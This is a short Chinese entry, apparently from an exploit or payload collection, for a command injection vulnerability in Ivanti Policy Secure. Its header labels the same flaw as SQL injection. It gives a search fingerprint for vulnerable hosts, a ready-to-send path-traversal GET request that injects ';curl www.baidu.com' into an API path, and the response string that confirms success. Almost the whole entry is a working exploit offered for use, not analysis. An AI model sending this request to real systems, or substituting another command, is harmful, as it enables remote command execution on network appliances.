# Ivantipolicysecure命令注入漏洞

Ivantipolicysecure ｜ SQL注入 ｜ —
- **指纹**：`body="welcome.cgi?p=logo"`
- **请求**：`GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20www.baidu.com HTTP/1.1`
- **响应特征**：200 ive-licCount